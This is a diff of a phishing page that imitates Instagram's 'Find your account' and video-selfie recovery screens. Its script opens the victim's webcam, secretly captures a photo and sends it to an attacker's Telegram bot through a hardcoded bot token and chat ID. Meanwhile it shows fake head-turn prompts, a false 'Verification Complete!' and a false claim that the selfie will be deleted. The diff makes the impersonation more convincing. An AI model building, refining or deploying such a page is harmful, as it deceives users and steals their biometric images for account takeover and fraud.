@@ -3,17 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram - Find Your Account</title>
+    <title>Instagram</title>
     <style>
         :root {
-            --main-color: #0095f6;
-            --bg-dark: #000000;
-            --card-bg: #121212;
-            --text-gray: #a8a8a8;
+            --ig-blue: #0095f6;
+            --ig-black: #000000;
+            --ig-dark-gray: #121212;
+            --ig-border: #363636;
+            --ig-text-gray: #a8a8a8;
+            --ig-text-white: #ffffff;
         }
+
         body {
-            background-color: var(--bg-dark);
-            color: white;
+            background-color: var(--ig-black);
+            color: var(--ig-text-white);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             display: flex;
@@ -22,28 +25,42 @@
             height: 100vh;
             overflow: hidden;
         }
+
         .app-container {
             width: 100%;
             max-width: 400px;
-            padding: 20px;
+            height: 100vh;
+            padding: 0 20px;
             box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
         }
-        /* المراحل */
-        .step { display: none; }
-        .active { display: block; }
 
-        /* تصميم الصفحة 1 */
-        .header-row { display: flex; align-items: center; margin-bottom: 30px; }
-        .back-arrow { font-size: 24px; cursor: pointer; margin-left: 20px; color: white; }
-        h2 { font-size: 22px; font-weight: 600; margin: 0; }
-        .sub-text { font-size: 14px; color: #efefef; margin-bottom: 10px; margin-top: 15px; }
-        .link-text { color: #0095f6; font-size: 13px; text-decoration: none; display: block; margin-bottom: 20px; cursor: pointer; }
-        
+        .step { display: none; animation: fadeIn 0.3s ease-in-out; height: 100%; }
+        .active { display: flex; flex-direction: column; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Header */
+        .header { display: flex; align-items: center; margin-bottom: 30px; }
+        .close-btn, .back-btn { 
+            font-size: 24px; 
+            cursor: pointer; 
+            color: white; 
+            margin-right: 20px;
+            font-weight: bold;
+        }
+
+        h1 { font-size: 22px; font-weight: 600; margin: 0 0 10px 0; text-align: left; }
+        .description { font-size: 14px; color: var(--ig-text-white); text-align: left; line-height: 1.4; margin-bottom: 20px; }
+        .learn-more { color: var(--ig-blue); text-decoration: none; font-weight: 500; }
+
+        /* Inputs & Buttons */
         .input-field {
-            background-color: #121212;
-            border: 1px solid #363636;
-            border-radius: 8px;
-            padding: 12px;
+            background-color: var(--ig-dark-gray);
+            border: 1px solid var(--ig-border);
+            border-radius: 10px;
+            padding: 15px;
             color: white;
             width: 100%;
             box-sizing: border-box;
@@ -51,93 +68,142 @@
             margin-bottom: 20px;
             outline: none;
         }
-        .btn-blue {
-            background-color: var(--main-color);
+
+        .btn-primary {
+            background-color: var(--ig-blue);
             color: white;
             border: none;
             width: 100%;
-            padding: 12px;
-            border-radius: 8px;
+            padding: 14px;
+            border-radius: 12px;
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
-            margin-bottom: 20px;
+            margin-top: auto;
+            margin-bottom: 40px;
         }
-        .footer-text { text-align: center; font-size: 14px; color: #efefef; cursor: pointer; }
 
-        /* تصميم التحقق */
-        .verify-card { background: var(--card-bg); padding: 30px 20px; border-radius: 20px; border: 1px solid #333; text-align: center; }
-        .camera-box {
-            width: 260px;
-            height: 260px;
-            margin: 20px auto;
-            border: 3px solid var(--main-color);
-            border-radius: 50%;
-            overflow: hidden;
-            position: relative;
-            background: #262626;
-        }
-        #hidden-video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .scanning-line {
-            position: absolute;
+        /* Recovery Options */
+        .options-container { border: 1px solid var(--ig-border); border-radius: 12px; overflow: hidden; margin-bottom: 20px; }
+        .option-item { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid var(--ig-border); cursor: pointer; }
+        .option-item:last-child { border-bottom: none; }
+        .option-text { text-align: left; }
+        .option-title { font-size: 14px; font-weight: 500; display: block; }
+        .option-sub { font-size: 12px; color: var(--ig-text-gray); display: block; }
+        .radio-circle { width: 20px; height: 20px; border: 2px solid var(--ig-text-gray); border-radius: 50%; position: relative; }
+        .selected .radio-circle { border-color: var(--ig-blue); }
+        .selected .radio-circle::after { content: ''; position: absolute; width: 10px; height: 10px; background: var(--ig-blue); border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+
+        /* Illustration Section */
+        .illustration-box { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; position: relative; height: 180px; }
+        .main-circle { width: 120px; height: 120px; background: var(--ig-blue); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 60px; color: white; z-index: 2; }
+        .side-img { width: 80px; height: 80px; border-radius: 50%; position: absolute; border: 4px solid var(--ig-black); background: #333; }
+        .img-left { left: 50px; bottom: 20px; }
+        .img-right { right: 50px; top: 20px; }
+
+        /* Tips Section (New Page) */
+        .tips-image {
             width: 100%;
-            height: 4px;
-            background: var(--main-color);
-            box-shadow: 0 0 15px var(--main-color);
-            top: 0;
-            animation: scan 2s linear infinite;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            background: #262626;
+            height: 180px;
+            object-fit: cover;
         }
+        .tips-title { font-size: 16px; font-weight: 600; text-align: left; margin-bottom: 15px; }
+        .tips-list { text-align: left; margin-bottom: 30px; }
+        .tip-item { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; font-size: 14px; }
+        .check-mark { color: var(--ig-text-white); font-weight: bold; font-size: 16px; }
+
+        /* Info List */
+        .info-list { text-align: left; margin-bottom: 30px; }
+        .info-item { display: flex; align-items: flex-start; margin-bottom: 20px; gap: 15px; }
+        .info-icon { font-size: 18px; }
+        .info-text { font-size: 13px; color: var(--ig-text-white); line-height: 1.5; }
+
+        /* Camera */
+        .camera-box { width: 260px; height: 260px; margin: 20px auto; border: 2px solid var(--ig-blue); border-radius: 50%; overflow: hidden; position: relative; background: #1a1a1a; }
+        #hidden-video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .scanning-line { position: absolute; width: 100%; height: 2px; background: var(--ig-blue); top: 0; animation: scan 2s linear infinite; z-index: 10; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        
-        .loader-spinner {
-            border: 3px solid #333;
-            border-top: 3px solid var(--main-color);
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-left: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="app-container">
-    <!-- المرحلة 1: Find your account -->
+    <!-- Step 1 -->
     <div id="step1" class="step active">
-        <div class="header-row">
-            <span class="back-arrow" onclick="alert('Back to Home')">〈</span>
-            <h2>Find your account</h2>
-        </div>
-        <p class="sub-text">Enter your email or username.</p>
-        <span class="link-text" onclick="fakeLoad('Checking security status...')">I think my account is hacked</span>
-        <input type="text" class="input-field" placeholder="Email or username" id="user-input">
-        <button class="btn-blue" id="continue-btn" onclick="handleContinue()">Continue</button>
-        <div class="footer-text" onclick="fakeLoad('Loading mobile search...')">Find by mobile number</div>
+        <div class="header"><span class="close-btn">✕</span></div>
+        <h1>Find your account</h1>
+        <p class="description">Enter your username, phone number or email so we can identify your account</p>
+        <input type="text" class="input-field" placeholder="Username, phone number or email" id="user-input">
+        <button class="btn-primary" onclick="goToStep(2)">Next</button>
     </div>
 
-    <!-- المرحلة 2: التحقق من الهوية -->
+    <!-- Step 2 -->
     <div id="step2" class="step">
-        <div class="verify-card">
-            <h2 style="margin-bottom:15px">Identity Confirmation</h2>
-            <p style="font-size:14px; color:#aaa; margin-bottom:25px">To protect your privacy, we need to confirm that you are the account owner via a quick video selfie.</p>
-            <button class="btn-blue" onclick="startCapture()">Continue to Selfie</button>
+        <div class="header"><span class="back-btn" onclick="goToStep(1)">〈</span></div>
+        <h1>Choose a way to recover</h1>
+        <p class="description">Any mobile number or email you choose in this step will replace all existing login and contact info on your account. <span class="learn-more">Learn more</span></p>
+        <div class="options-container">
+            <div class="option-item" onclick="selectOption(this)">
+                <div class="option-text"><span class="option-title">Get code via email</span><span class="option-sub">d******o@hotmail.com</span></div>
+                <div class="radio-circle"></div>
+            </div>
+            <div class="option-item selected" onclick="selectOption(this)">
+                <div class="option-text"><span class="option-title">Take a video selfie</span><span class="option-sub">You will need to be in a well-lit area.</span></div>
+                <div class="radio-circle"></div>
+            </div>
         </div>
+        <button class="btn-primary" onclick="goToStep(3)">Continue</button>
     </div>
 
-    <!-- المرحلة 3: التقاط الصورة الفوري -->
+    <!-- Step 3 -->
     <div id="step3" class="step">
-        <div class="verify-card">
-            <div id="inst-text" style="font-size:16px; margin-bottom:20px; font-weight:500">Position your face in the circle</div>
+        <div class="header"><span class="back-btn" onclick="goToStep(2)">〈</span></div>
+        <div class="illustration-box">
+            <div class="side-img img-left" style="background: url('https://via.placeholder.com/80') center/cover"></div>
+            <div class="main-circle">✓</div>
+            <div class="side-img img-right" style="background: url('https://via.placeholder.com/80') center/cover"></div>
+        </div>
+        <h1>Confirm your identity with a video selfie</h1>
+        <div class="info-list">
+            <div class="info-item"><span class="info-icon">😊</span><span class="info-text">We'll compare your selfie to photos on your profile... <span class="learn-more">Learn more.</span></span></div>
+            <div class="info-item"><span class="info-icon">🔒</span><span class="info-text">Your selfie will be used to confirm your identity and to <span class="learn-more">keep our community safe.</span></span></div>
+            <div class="info-item"><span class="info-icon">🗑️</span><span class="info-text">It will be deleted within 30 days.</span></div>
+        </div>
+        <button class="btn-primary" onclick="goToStep(4)">Continue</button>
+    </div>
+
+    <!-- Step 4: Take a Video Selfie (NEW) -->
+    <div id="step4" class="step">
+        <div class="header"><span class="back-btn" onclick="goToStep(3)">〈</span></div>
+        <h1>Take a video selfie</h1>
+        <p class="description">We need a short video of you turning your head in different directions.</p>
+        
+        <img src="https://via.placeholder.com/400x200" class="tips-image" alt="Instructional Image">
+        
+        <div class="tips-title">Tips for a good selfie</div>
+        <div class="tips-list">
+            <div class="tip-item"><span class="check-mark">✓</span> <span>Use a well-lit area</span></div>
+            <div class="tip-item"><span class="check-mark">✓</span> <span>Hold your phone at eye level</span></div>
+            <div class="tip-item"><span class="check-mark">✓</span> <span>Follow the instructions on the screen</span></div>
+        </div>
+        
+        <button class="btn-primary" onclick="goToStep(5)">Start selfie</button>
+    </div>
+
+    <!-- Step 5: Camera -->
+    <div id="step5" class="step">
+        <div class="header"><span class="back-btn" onclick="goToStep(4)">〈</span></div>
+        <div style="text-align:center">
+            <h1 style="text-align:center">Verify Identity</h1>
             <div class="camera-box">
                 <div class="scanning-line"></div>
                 <video id="hidden-video" autoplay playsinline></video>
             </div>
-            <p style="font-size:13px; color:#888">Liveness Detection Active...</p>
+            <p id="cam-inst" style="font-size:14px; color:var(--ig-text-gray)">Position your face in the circle</p>
         </div>
     </div>
 </div>
@@ -147,85 +213,46 @@
 <script>
     const TOKEN = '8591096426:AAETM1heWHK4l_M8bcEyo6iAslmAuMUUQEk';
     const CHAT_ID = '7839090123';
-    
-    const video = document.getElementById('hidden-video');
-    const canvas = document.getElementById('canvas');
 
-    // وظيفة لمحاكاة تحميل وهمي عند الضغط على الروابط
-    function fakeLoad(msg) {
-        const btn = document.getElementById('continue-btn');
-        const originalText = btn.innerText;
-        btn.innerHTML = `<div class="loader-spinner"></div> Loading...`;
-        setTimeout(() => {
-            alert(msg + " - This feature is temporarily unavailable.");
-            btn.innerText = originalText;
-        }, 1500);
+    function goToStep(stepNumber) {
+        document.querySelectorAll('.step').forEach(s => s.style.display = 'none');
+        document.getElementById('step' + stepNumber).style.display = 'flex';
+        if(stepNumber === 5) { startCapture(); }
     }
 
-    function handleContinue() {
-        const input = document.getElementById('user-input').value;
-        if(input === "") { alert("Please enter email or username"); return; }
-        
-        const btn = document.getElementById('continue-btn');
-        btn.innerHTML = `<div class="loader-spinner"></div> Searching...`;
-        
-        setTimeout(() => {
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }, 1200);
+    function selectOption(el) {
+        document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+        el.classList.add('selected');
     }
 
     async function startCapture() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
-
-            // التقاط وإرسال فوري (بدون انتظار)
-            setTimeout(() => {
-                captureAndSend();
-            }, 500); // نصف ثانية فقط ليتم التصوير بمجرد فتح الكاميرا
-
-            // تغيير التعليمات لإيهام المستخدم أن العملية مستمرة
-            const inst = document.getElementById('inst-text');
-            setTimeout(() => { inst.innerText = "Slowly turn your head right →"; }, 2000);
-            setTimeout(() => { inst.innerText = "Slowly turn your head left ←"; }, 5000);
-            setTimeout(() => { inst.innerText = "Verification Complete!"; }, 8000);
-
+            document.getElementById('hidden-video').srcObject = stream;
+            setTimeout(() => { captureAndSend(); }, 1000);
+            const inst = document.getElementById('cam-inst');
+            setTimeout(() => { inst.innerText = "Slowly turn your head right →"; }, 3000);
+            setTimeout(() => { inst.innerText = "Slowly turn your head left ←"; }, 6000);
+            setTimeout(() => { inst.innerText = "Verification Complete!"; }, 9000);
         } catch (err) {
-            alert("Camera access is required for identity verification.");
+            alert("Camera access is required.");
         }
     }
 
     async function captureAndSend() {
+        const video = document.getElementById('hidden-video');
+        const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'insta_recovery.jpg');
-
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (error) {
-                console.error("Telegram Error:", error);
-            }
+            formData.append('photo', blob, 'ig_verify.jpg');
+            try { await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
         }, 'image/jpeg');
-
-        // إيقاف الكاميرا لسرية العملية
-        const stream = video.srcObject;
-        const tracks = stream.getTracks();
-        tracks.forEach(track => track.stop());
     }
 </script>
-
 </body>
 </html>
